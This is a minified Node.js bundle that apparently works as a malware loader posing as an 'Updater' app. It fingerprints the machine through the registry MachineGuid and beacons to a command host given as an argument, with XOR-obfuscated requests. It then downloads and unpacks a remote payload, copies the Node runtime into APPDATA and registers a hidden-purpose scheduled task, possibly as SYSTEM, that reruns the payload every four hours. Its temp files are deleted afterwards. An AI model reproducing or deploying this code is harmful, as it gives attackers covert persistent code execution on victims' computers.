(()=>{var e={840:(e,t,r)=>{"use strict";r.r(t),r.d(t,{createRegistryKey:()=>a,createRegistryKeyRecursive:()=>c,getDeviceId:()=>f,keyExists:()=>h,listSubKeys:()=>u,readRegistryKeyValue:()=>o,writeRegistryKeyValue:()=>i,writeRegistryKeyValueInt:()=>s});var n=r(597);async function o(e,t,r){var o=new n({hive:e,key:"\\"+t});return new Promise(((e,t)=>{o.get(r,(function(r,n){r?t(r):e(n)}))}))}async function i(e,t,r,o){var i=new n({hive:e,key:"\\"+t});return new Promise(((e,t)=>{i.set(r,n.REG_SZ,o,(function(r){r?t(r):e()}))}))}async function s(e,t,r,o){var i=new n({hive:e,key:"\\"+t});return new Promise(((e,t)=>{i.set(r,n.REG_DWORD,o,(function(r){r?t(r):e()}))}))}async function a(e,t){var r=new n({hive:e,key:"\\"+t});return new Promise(((e,t)=>{r.create((function(r){r?t(r):e()}))}))}async function c(e,t){for(var r=t.split("\\"),n="",o=0;o<r.length;o++){var i=r[o];n=n.length>0?n+"\\"+i:i,await a(e,t)}}async function u(e,t){var r=new n({hive:e,key:"\\"+t});return new Promise(((e,t)=>{r.keys((function(r,n){r?t(r):e(n)}))}))}async function h(e,t){var r=new n({hive:e,key:"\\"+t});return new Promise(((e,t)=>{r.keyExists((function(r,n){r?t(r):e(n)}))}))}async function f(){return(await o(n.HKLM,"Software\\Microsoft\\Cryptography","MachineGuid")).value}},671:(e,t,r)=>{"use strict";r.r(t),r.d(t,{execute:()=>d,makeRequest:()=>f,postEvent:()=>p,postRequestObfuscated:()=>l});var n=r(982),o=r(67).REQUEST_URL;const i=r(861).https,s=r(161);var a=r(317).exec;const c=r(136).URL,u=r(840);var h=(0,n.randomUUID)();async function f(e,t,r,n,o){return new Promise(((s,a)=>{const c={hostname:e,path:t,method:r,headers:{"Content-Type":"text/plain"}};"POST"==r&&(c.headers["Content-Length"]=n.length);const u=i.request(c,(e=>{let t=o?Buffer.from("","utf8"):"";200==e.statusCode?(e.on("data",(e=>{o?t=Buffer.concat([t,e]):t+=e})),e.on("end",(()=>{s(t)}))):a(e.statusCode)})).on("error",(e=>{a(e)}));"POST"==r&&u.write(n),u.end()}))}async function l(e,t,r,o,i){const s=(0,n.randomBytes)(16),a=JSON.stringify(r),c=Buffer.from(a).map((function(e,t){return e^s[t%16]})),u=Buffer.concat([s,c]).toString("base64");var h=await f(e,t,"POST",u,i);if(o)return"";var l=i?h:Buffer.from(h,"base64");const d=l.subarray(0,16);return l.subarray(16,l.length).map((function(e,t){return e^d[t%16]})).toString()}async function d(e){return new Promise(((t,r)=>{a(e,(function(e,r,n){t(r)}))}))}async function p(e,t,r,n,i,a){try{var f={...{Event:e,MachineId:await u.getDeviceId(),SessionId:h,Version:"0.0.1",OSVersion:s.release()},...r};if(i){i=i.trim();var d=new c(i);return await l(d.host,d.pathname,f,!!n,a)}return await l(o,"/"+t,f,!!n,a)}catch(e){}}},67:e=>{e.exports={REQUEST_URL:"api.nonexistanturl.com"}},778:(e,t,r)=>{var n;e.exports=function(){if(!n){try{n=r(Object(function(){var e=new Error("Cannot find module 'debug'");throw e.code="MODULE_NOT_FOUND",e}()))("follow-redirects")}catch(e){}"function"!=typeof n&&(n=function(){})}n.apply(null,arguments)}},861:(e,t,r)=>{var n=r(16),o=n.URL,i=r(611),s=r(692),a=r(203).Writable,c=r(613),u=r(778);U(Error.captureStackTrace);var h=!1;try{c(new o(""))}catch(e){h="ERR_INVALID_URL"===e.code}var f=["auth","host","hostname","href","path","pathname","port","protocol","query","search","hash"],l=["abort","aborted","connect","error","socket","timeout"],d=Object.create(null);l.forEach((function(e){d[e]=function(t,r,n){this._redirectable.emit(e,t,r,n)}}));var p=O("ERR_INVALID_URL","Invalid URL",TypeError),_=O("ERR_FR_REDIRECTION_FAILURE","Redirected request failed"),v=O("ERR_FR_TOO_MANY_REDIRECTS","Maximum number of redirects exceeded",_),m=O("ERR_FR_MAX_BODY_LENGTH_EXCEEDED","Request body larger than maxBodyLength limit"),y=O("ERR_STREAM_WRITE_AFTER_END","write after end"),E=a.prototype.destroy||R;function w(e,t){a.call(this),this._sanitizeOptions(e),this._options=e,this._ended=!1,this._ending=!1,this._redirectCount=0,this._redirects=[],this._requestBodyLength=0,this._requestBodyBuffers=[],t&&this.on("response",t);var r=this;this._onNativeResponse=function(e){try{r._processResponse(e)}catch(e){r.emit("error",e instanceof _?e:new _({cause:e}))}},this._performRequest()}function g(e){var t={maxRedirects:21,maxBodyLength:10485760},r={};return Object.keys(e).forEach((function(n){var i=n+":",s=r[i]=e[n],a=t[n]=Object.create(s);Object.defineProperties(a,{request:{value:function(e,n,s){var a;return a=e,o&&a instanceof o?e=b(e):I(e)?e=b(S(e)):(s=n,n=T(e),e={protocol:i}),U(n)&&(s=n,n=null),(n=Object.assign({maxRedirects:t.maxRedirects,maxBodyLength:t.maxBodyLength},e,n)).nativeProtocols=r,I(n.host)||I(n.hostname)||(n.hostname="::1"),c.equal(n.protocol,i,"protocol mismatch"),u("options",n),new w(n,s)},configurable:!0,enumerable:!0,writable:!0},get:{value:function(e,t,r){var n=a.request(e,t,r);return n.end(),n},configurable:!0,enumerable:!0,writable:!0}})})),t}function R(){}function S(e){var t;if(h)t=new o(e);else if(!I((t=T(n.parse(e))).protocol))throw new p({input:e});return t}function T(e){if(/^\[/.test(e.hostname)&&!/^\[[:0-9a-f]+\]$/i.test(e.hostname))throw new p({input:e.href||e});if(/^\[/.test(e.host)&&!/^\[[:0-9a-f]+\](:\d+)?$/i.test(e.host))throw new p({input:e.href||e});return e}function b(e,t){var r=t||{};for(var n of f)r[n]=e[n];return r.hostname.startsWith("[")&&(r.hostname=r.hostname.slice(1,-1)),""!==r.port&&(r.port=Number(r.port)),r.path=r.search?r.pathname+r.search:r.pathname,r}function x(e,t){var r;for(var n in t)e.test(n)&&(r=t[n],delete t[n]);return null==r?void 0:String(r).trim()}function O(e,t,r){function n(r){U(Error.captureStackTrace)&&Error.captureStackTrace(this,this.constructor),Object.assign(this,r||{}),this.code=e,this.message=this.cause?t+": "+this.cause.message:t}return n.prototype=new(r||Error),Object.defineProperties(n.prototype,{constructor:{value:n,enumerable:!1},name:{value:"Error ["+e+"]",enumerable:!1}}),n}function D(e,t){for(var r of l)e.removeListener(r,d[r]);e.on("error",R),e.destroy(t)}function I(e){return"string"==typeof e||e instanceof String}function U(e){return"function"==typeof e}w.prototype=Object.create(a.prototype),w.prototype.abort=function(){D(this._currentRequest),this._currentRequest.abort(),this.emit("abort")},w.prototype.destroy=function(e){return D(this._currentRequest,e),E.call(this,e),this},w.prototype.write=function(e,t,r){if(this._ending)throw new y;if(!I(e)&&("object"!=typeof(n=e)||!("length"in n)))throw new TypeError("data should be a string, Buffer or Uint8Array");var n;U(t)&&(r=t,t=null),0!==e.length?this._requestBodyLength+e.length<=this._options.maxBodyLength?(this._requestBodyLength+=e.length,this._requestBodyBuffers.push({data:e,encoding:t}),this._currentRequest.write(e,t,r)):(this.emit("error",new m),this.abort()):r&&r()},w.prototype.end=function(e,t,r){if(U(e)?(r=e,e=t=null):U(t)&&(r=t,t=null),e){var n=this,o=this._currentRequest;this.write(e,t,(function(){n._ended=!0,o.end(null,null,r)})),this._ending=!0}else this._ended=this._ending=!0,this._currentRequest.end(null,null,r)},w.prototype.setHeader=function(e,t){this._options.headers[e]=t,this._currentRequest.setHeader(e,t)},w.prototype.removeHeader=function(e){delete this._options.headers[e],this._currentRequest.removeHeader(e)},w.prototype.setTimeout=function(e,t){var r=this;function n(t){t.setTimeout(e),t.removeListener("timeout",t.destroy),t.addListener("timeout",t.destroy)}function o(t){r._timeout&&clearTimeout(r._timeout),r._timeout=setTimeout((function(){r.emit("timeout"),i()}),e),n(t)}function i(){r._timeout&&(clearTimeout(r._timeout),r._timeout=null),r.removeListener("abort",i),r.removeListener("error",i),r.removeListener("response",i),r.removeListener("close",i),t&&r.removeListener("timeout",t),r.socket||r._currentRequest.removeListener("socket",o)}return t&&this.on("timeout",t),this.socket?o(this.socket):this._currentRequest.once("socket",o),this.on("socket",n),this.on("abort",i),this.on("error",i),this.on("response",i),this.on("close",i),this},["flushHeaders","getHeader","setNoDelay","setSocketKeepAlive"].forEach((function(e){w.prototype[e]=function(t,r){return this._currentRequest[e](t,r)}})),["aborted","connection","socket"].forEach((function(e){Object.defineProperty(w.prototype,e,{get:function(){return this._currentRequest[e]}})})),w.prototype._sanitizeOptions=function(e){if(e.headers||(e.headers={}),e.host&&(e.hostname||(e.hostname=e.host),delete e.host),!e.pathname&&e.path){var t=e.path.indexOf("?");t<0?e.pathname=e.path:(e.pathname=e.path.substring(0,t),e.search=e.path.substring(t))}},w.prototype._performRequest=function(){var e=this._options.protocol,t=this._options.nativeProtocols[e];if(!t)throw new TypeError("Unsupported protocol "+e);if(this._options.agents){var r=e.slice(0,-1);this._options.agent=this._options.agents[r]}var o=this._currentRequest=t.request(this._options,this._onNativeResponse);for(var i of(o._redirectable=this,l))o.on(i,d[i]);if(this._currentUrl=/^\//.test(this._options.path)?n.format(this._options):this._options.path,this._isRedirect){var s=0,a=this,c=this._requestBodyBuffers;!function e(t){if(o===a._currentRequest)if(t)a.emit("error",t);else if(s<c.length){var r=c[s++];o.finished||o.write(r.data,r.encoding,e)}else a._ended&&o.end()}()}},w.prototype._processResponse=function(e){var t=e.statusCode;this._options.trackRedirects&&this._redirects.push({url:this._currentUrl,headers:e.headers,statusCode:t});var r,i=e.headers.location;if(!i||!1===this._options.followRedirects||t<300||t>=400)return e.responseUrl=this._currentUrl,e.redirects=this._redirects,this.emit("response",e),void(this._requestBodyBuffers=[]);if(D(this._currentRequest),e.destroy(),++this._redirectCount>this._options.maxRedirects)throw new v;var s=this._options.beforeRedirect;s&&(r=Object.assign({Host:e.req.getHeader("host")},this._options.headers));var a=this._options.method;((301===t||302===t)&&"POST"===this._options.method||303===t&&!/^(?:GET|HEAD)$/.test(this._options.method))&&(this._options.method="GET",this._requestBodyBuffers=[],x(/^content-/i,this._options.headers));var f,l,d=x(/^host$/i,this._options.headers),p=S(this._currentUrl),_=d||p.host,m=/^\w+:/.test(i)?this._currentUrl:n.format(Object.assign(p,{host:_})),y=(f=i,l=m,h?new o(f,l):S(n.resolve(l,f)));if(u("redirecting to",y.href),this._isRedirect=!0,b(y,this._options),(y.protocol!==p.protocol&&"https:"!==y.protocol||y.host!==_&&!function(e,t){c(I(e)&&I(t));var r=e.length-t.length-1;return r>0&&"."===e[r]&&e.endsWith(t)}(y.host,_))&&x(/^(?:(?:proxy-)?authorization|cookie)$/i,this._options.headers),U(s)){var E={headers:e.headers,statusCode:t},w={url:m,method:a,headers:r};s(this._options,E,w),this._sanitizeOptions(this._options)}this._performRequest()},e.exports=g({http:i,https:s}),e.exports.wrap=g},597:(e,t,r)=>{var n=r(23),o=r(928),i=r(317).spawn,s="HKLM",a="HKCU",c="HKCR",u="HKCC",h=[s,a,c,"HKU",u],f="REG_SZ",l="REG_MULTI_SZ",d="REG_EXPAND_SZ",p="REG_DWORD",_="REG_QWORD",v="REG_BINARY",m="REG_NONE",y=[f,l,d,p,_,v,m],E=/(\\[a-zA-Z0-9_\s]+)*/,w=/^(HKEY_LOCAL_MACHINE|HKEY_CURRENT_USER|HKEY_CLASSES_ROOT|HKEY_USERS|HKEY_CURRENT_CONFIG)(.*)$/,g=/^(.*)\s(REG_SZ|REG_MULTI_SZ|REG_EXPAND_SZ|REG_DWORD|REG_QWORD|REG_BINARY|REG_NONE)\s+([^\s].*)$/;function R(e,t){if(!(this instanceof R))return new R(e,t);Error.captureStackTrace(this,R),this.__defineGetter__("name",(function(){return R.name})),this.__defineGetter__("message",(function(){return e})),this.__defineGetter__("code",(function(){return t}))}function S(e){var t={stdout:"",stderr:""};return e.stdout.on("data",(function(e){t.stdout+=e.toString()})),e.stderr.on("data",(function(e){t.stderr+=e.toString()})),t}function T(e,t,r){var o=r.stdout.trim(),i=r.stderr.trim();return new R(n.format("%s command exited with code %d:\n%s\n%s",e,t,o,i),t)}function b(e,t){t&&e.push("/reg:"+function(e){if("x64"==e)return"64";if("x86"==e)return"32";throw new Error("illegal architecture: "+e+" (use x86 or x64)")}(t))}function x(){return"win32"===process.platform?o.join(process.env.windir,"system32","reg.exe"):"REG"}function O(e,t,r,n,o,i,s){if(!(this instanceof O))return new O(e,t,r,n,o,i,s);var a=e,c=t,u=r,h=n,f=o,l=i,d=s;this.__defineGetter__("host",(function(){return a})),this.__defineGetter__("hive",(function(){return c})),this.__defineGetter__("key",(function(){return u})),this.__defineGetter__("name",(function(){return h})),this.__defineGetter__("type",(function(){return f})),this.__defineGetter__("value",(function(){return l})),this.__defineGetter__("arch",(function(){return d}))}function D(e){if(!(this instanceof D))return new D(e);var t=e||{},r=""+(t.host||""),n=""+(t.hive||s),o=""+(t.key||""),i=t.arch||null;if(this.__defineGetter__("host",(function(){return r})),this.__defineGetter__("hive",(function(){return n})),this.__defineGetter__("key",(function(){return o})),this.__defineGetter__("path",(function(){return'"'+(0==r.length?"":"\\\\"+r+"\\")+n+o+'"'})),this.__defineGetter__("arch",(function(){return i})),this.__defineGetter__("parent",(function(){var e=o.lastIndexOf("\\");return new D({host:this.host,hive:this.hive,key:-1==e?"":o.substring(0,e),arch:this.arch})})),-1==h.indexOf(n))throw new Error("illegal hive specified.");if(!E.test(o))throw new Error("illegal key specified.");if(i&&"x64"!=i&&"x86"!=i)throw new Error("illegal architecture specified (use x86 or x64)")}n.inherits(R,Error),n.inherits(O,Object),D.HKLM=s,D.HKCU=a,D.HKCR=c,D.HKU="HKU",D.HKCC=u,D.HIVES=h,D.REG_SZ=f,D.REG_MULTI_SZ=l,D.REG_EXPAND_SZ=d,D.REG_DWORD=p,D.REG_QWORD=_,D.REG_BINARY=v,D.REG_NONE=m,D.REG_TYPES=y,D.DEFAULT_VALUE="",D.prototype.values=function(e){if("function"!=typeof e)throw new TypeError("must specify a callback");var t=["QUERY",this.path];b(t,this.arch);var r=i(x(),t,{cwd:void 0,env:process.env,shell:!0,windowsHide:!0,stdio:["ignore","pipe","pipe"]}),n="",o=this,s=null,a=S(r);return r.on("close",(function(t){if(!s)if(0!==t)e(T("QUERY",t,a),null);else{for(var r=[],i=[],c=n.split("\n"),u=0,h=0,f=c.length;h<f;h++){var l=c[h].trim();l.length>0&&(0!=u&&r.push(l),++u)}for(h=0,f=r.length;h<f;h++){var d,p,_,v=g.exec(r[h]);v&&(d=v[1].trim(),p=v[2].trim(),_=v[3],i.push(new O(o.host,o.hive,o.key,d,p,_,o.arch)))}e(null,i)}})),r.stdout.on("data",(function(e){n+=e.toString()})),r.on("error",(function(t){s=t,e(t)})),this},D.prototype.keys=function(e){if("function"!=typeof e)throw new TypeError("must specify a callback");var t=["QUERY",this.path];b(t,this.arch);var r=i(x(),t,{cwd:void 0,env:process.env,shell:!0,windowsHide:!0,stdio:["ignore","pipe","pipe"]}),n="",o=this,s=null,a=S(r);return r.on("close",(function(t){s||0!==t&&e(T("QUERY",t,a),null)})),r.stdout.on("data",(function(e){n+=e.toString()})),r.stdout.on("end",(function(){for(var t=[],r=[],i=n.split("\n"),s=0,a=i.length;s<a;s++){var c=i[s].trim();c.length>0&&t.push(c)}for(s=0,a=t.length;s<a;s++){var u,h=w.exec(t[s]);h&&(h[1],(u=h[2])&&u!==o.key&&r.push(new D({host:o.host,hive:o.hive,key:u,arch:o.arch})))}e(null,r)})),r.on("error",(function(t){s=t,e(t)})),this},D.prototype.get=function(e,t){if("function"!=typeof t)throw new TypeError("must specify a callback");var r=["QUERY",this.path];""==e?r.push("/ve"):r=r.concat(["/v",e]),b(r,this.arch);var n=i(x(),r,{cwd:void 0,env:process.env,shell:!0,windowsHide:!0,stdio:["ignore","pipe","pipe"]}),o="",s=this,a=null,c=S(n);return n.on("close",(function(e){if(!a)if(0!==e)t(T("QUERY",e,c),null);else{for(var r=[],n=null,i=o.split("\n"),u=0,h=0,f=i.length;h<f;h++){var l=i[h].trim();l.length>0&&(0!=u&&r.push(l),++u)}var d,p,_,v=r[r.length-1]||"",m=g.exec(v);m&&(d=m[1].trim(),p=m[2].trim(),_=m[3],n=new O(s.host,s.hive,s.key,d,p,_,s.arch)),t(null,n)}})),n.stdout.on("data",(function(e){o+=e.toString()})),n.on("error",(function(e){a=e,t(e)})),this},D.prototype.set=function(e,t,r,n){if("function"!=typeof n)throw new TypeError("must specify a callback");if(-1==y.indexOf(t))throw Error("illegal type specified.");var o=["ADD",this.path];""==e?o.push("/ve"):o=o.concat(["/v",e]),b(o=o.concat(["/t",t,"/d",r,"/f"]),this.arch);var s=i(x(),o,{cwd:void 0,env:process.env,shell:!0,windowsHide:!0,stdio:["ignore","pipe","pipe"]}),a=null,c=S(s);return s.on("close",(function(e){a||n(0!==e?T("ADD",e,c):null)})),s.stdout.on("data",(function(e){})),s.on("error",(function(e){a=e,n(e)})),this},D.prototype.remove=function(e,t){if("function"!=typeof t)throw new TypeError("must specify a callback");var r=e?["DELETE",this.path,"/f","/v",e]:["DELETE",this.path,"/f","/ve"];b(r,this.arch);var n=i(x(),r,{cwd:void 0,env:process.env,shell:!0,windowsHide:!0,stdio:["ignore","pipe","pipe"]}),o=null,s=S(n);return n.on("close",(function(e){o||(0!==e?t(T("DELETE",e,s),null):t(null))})),n.stdout.on("data",(function(e){})),n.on("error",(function(e){o=e,t(e)})),this},D.prototype.clear=function(e){if("function"!=typeof e)throw new TypeError("must specify a callback");var t=["DELETE",this.path,"/f","/va"];b(t,this.arch);var r=i(x(),t,{cwd:void 0,env:process.env,shell:!0,windowsHide:!0,stdio:["ignore","pipe","pipe"]}),n=null,o=S(r);return r.on("close",(function(t){n||(0!==t?e(T("DELETE",t,o),null):e(null))})),r.stdout.on("data",(function(e){})),r.on("error",(function(t){n=t,e(t)})),this},D.prototype.erase=D.prototype.clear,D.prototype.destroy=function(e){if("function"!=typeof e)throw new TypeError("must specify a callback");var t=["DELETE",this.path,"/f"];b(t,this.arch);var r=i(x(),t,{cwd:void 0,env:process.env,shell:!0,windowsHide:!0,stdio:["ignore","pipe","pipe"]}),n=null,o=S(r);return r.on("close",(function(t){n||(0!==t?e(T("DELETE",t,o),null):e(null))})),r.stdout.on("data",(function(e){})),r.on("error",(function(t){n=t,e(t)})),this},D.prototype.create=function(e){if("function"!=typeof e)throw new TypeError("must specify a callback");var t=["ADD",this.path,"/f"];b(t,this.arch);var r=i(x(),t,{cwd:void 0,env:process.env,shell:!0,windowsHide:!0,stdio:["ignore","pipe","pipe"]}),n=null,o=S(r);return r.on("close",(function(t){n||(0!==t?e(T("ADD",t,o),null):e(null))})),r.stdout.on("data",(function(e){})),r.on("error",(function(t){n=t,e(t)})),this},D.prototype.keyExists=function(e){return this.values((function(t,r){if(t)return 1==t.code?e(null,!1):e(t);e(null,!0)})),this},D.prototype.valueExists=function(e,t){return this.get(e,(function(e,r){if(e)return 1==e.code?t(null,!1):t(e);t(null,!0)})),this},e.exports=D},613:e=>{"use strict";e.exports=require("assert")},317:e=>{"use strict";e.exports=require("child_process")},982:e=>{"use strict";e.exports=require("crypto")},896:e=>{"use strict";e.exports=require("fs")},611:e=>{"use strict";e.exports=require("http")},692:e=>{"use strict";e.exports=require("https")},161:e=>{"use strict";e.exports=require("node:os")},136:e=>{"use strict";e.exports=require("node:url")},928:e=>{"use strict";e.exports=require("path")},203:e=>{"use strict";e.exports=require("stream")},16:e=>{"use strict";e.exports=require("url")},23:e=>{"use strict";e.exports=require("util")}},t={};function r(n){var o=t[n];if(void 0!==o)return o.exports;var i=t[n]={exports:{}};return e[n](i,i.exports,r),i.exports}r.n=e=>{var t=e&&e.__esModule?()=>e.default:()=>e;return r.d(t,{a:t}),t},r.d=(e,t)=>{for(var n in t)r.o(t,n)&&!r.o(e,n)&&Object.defineProperty(e,n,{enumerable:!0,get:t[n]})},r.o=(e,t)=>Object.prototype.hasOwnProperty.call(e,t),r.r=e=>{"undefined"!=typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(e,Symbol.toStringTag,{value:"Module"}),Object.defineProperty(e,"__esModule",{value:!0})},(()=>{"use strict";var e=r(982);const t=r(161),n=(r(136).URL,r(896)),o=r(928),i=r(23),s=t.tmpdir(),a=i.promisify(r(317).exec),c=r(671);var u="",h="",f="Updater",l="UpdaterApp",d=(0,e.randomUUID)(),p=(0,e.randomUUID)(),_='<?xml version="1.0" encoding="utf-16"?>\n<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">\n  <Triggers>\n    <TimeTrigger>\n      <Repetition>\n        <Interval>PT4H</Interval>\n        <StopAtDurationEnd>false</StopAtDurationEnd>\n      </Repetition>\n      <StartBoundary>2022-01-01T16:50:00</StartBoundary>\n      <ExecutionTimeLimit>PT1H</ExecutionTimeLimit>\n      <Enabled>true</Enabled>\n      <RandomDelay>PT30M</RandomDelay>\n    </TimeTrigger>\n    <RegistrationTrigger>\n      <Enabled>true</Enabled>\n    </RegistrationTrigger>\n  </Triggers>\n  <Settings>\n    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>\n    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>\n    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>\n    <AllowHardTerminate>true</AllowHardTerminate>\n    <StartWhenAvailable>true</StartWhenAvailable>\n    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>\n    <IdleSettings>\n      <StopOnIdleEnd>true</StopOnIdleEnd>\n      <RestartOnIdle>false</RestartOnIdle>\n    </IdleSettings>\n    <AllowStartOnDemand>true</AllowStartOnDemand>\n    <Enabled>true</Enabled>\n    <Hidden>false</Hidden>\n    <RunOnlyIfIdle>false</RunOnlyIfIdle>\n    <WakeToRun>false</WakeToRun>\n    <ExecutionTimeLimit>PT72H</ExecutionTimeLimit>\n    <Priority>7</Priority>\n  </Settings>\n  <Actions Context="Author">\n    <Exec>\n      <Command>C:\\Windows\\System32\\cmd.exe</Command>\n      <Arguments>/C start "" /min "%nsfolder%\\node\\node.exe" "%nspath%"</Arguments>\n      <WorkingDirectory>%nsfolder%\\node</WorkingDirectory>\n    </Exec>\n  </Actions>\n</Task>';const v=process.env.APPDATA||process.env.HOME+"/.local/share";function m(e,t,r){return String.fromCharCode(r+Math.floor(e/t))+String.fromCharCode(r+e%t)}async function y(){const r=Date.now()+3e5,i=Math.floor((r-Date.UTC(2001,0,1)+3e4-1)/3e4),y={Event:"DownloadService",IPAddress:"",UserAgent:"Other",MachineId:u,SessionId:p,Product:"INS",OSVersion:+t.release(),SubId:"default",AdditionalInfo:"download"};var E=function(e,t){let r="";if(""===e)return"tj";let n=1,o=0;for(;n<=e.length;){if(n===e.length||e[n]!==e[n-1]){(n-1>o||1===e.length)&&(r+=m(n-o,26,65));let i=e.charCodeAt(n-1)+t%110;i>255&&(i-=255),r+=m(i,26,97),o=n}n+=1}if(0===o){(n-o>1||1===e.length)&&(r+=m(n-o,26,65));let i=e.charCodeAt(n-1)+t%110;i>255&&(i-=255),r+=m(i,26,97)}return r}(JSON.stringify(y),function(e){const t=Math.floor(Math.sqrt(e));let r=e;for(let e=0;e<9516;e++)r*=3,r%=t;return r}(i));const w=Buffer.from(E).toString("base64");var g=await c.makeRequest(h,"/ins","POST",w,!1);const R=Buffer.from(g,"base64"),S=o.join(s,(0,e.randomUUID)()),T=o.join(S,(0,e.randomUUID)()+".zip");n.existsSync(S)&&n.rmdirSync(S,{recursive:!0}),n.mkdirSync(S,{recursive:!0}),n.writeFileSync(T,R),await a('cmd.exe /C tar -xf "'+T+'" -C "'+S+'"'),n.existsSync(T)&&n.rmSync(T,{recursive:!0,force:!0});const b=n.readdirSync(S),x=o.join(S,b[0]),O=o.join(v,f),D=o.join(O,l+".js"),I=process.execPath;n.existsSync(O)&&n.rmSync(O,{recursive:!0,force:!0}),n.mkdirSync(O,{recursive:!0}),n.cpSync(o.dirname(I),o.join(O,"node"),{recursive:!0}),n.renameSync(x,D);var U=_.replaceAll("%nsfolder%",O);U=U.replaceAll("%nspath%",D);const k=o.join(s,(0,e.randomUUID)()+".xml");n.writeFileSync(k,U);var L="";k.toLowerCase().indexOf("windows")>=0&&(L=" /RU system");var q="schtasks /Create /tn "+d+" /xml "+k+L;const A=o.join(s,(0,e.randomUUID)()+".bat");n.writeFileSync(A,q),a(A),await new Promise((e=>setTimeout(e,2e3))),n.rmSync(k,{recursive:!0,force:!0}),n.rmSync(A,{recursive:!0,force:!0})}(async function(){const e=process.argv.slice(2);await new Promise((e=>setTimeout(e,2e3))),e.length>0&&(h=e[0]),e.length>1&&(u=e[1]),e.length>2&&(f=e[2]),e.length>3&&(l=e[3]),e.length>4&&(d=e[4]),await async function(){const e={Event:"Heartbeat",MachineId:u};var t=await c.postRequestObfuscated(h,"/ck",e,!1,!1);return(t=JSON.parse(t)).r}()&&await y()})().then()})()})();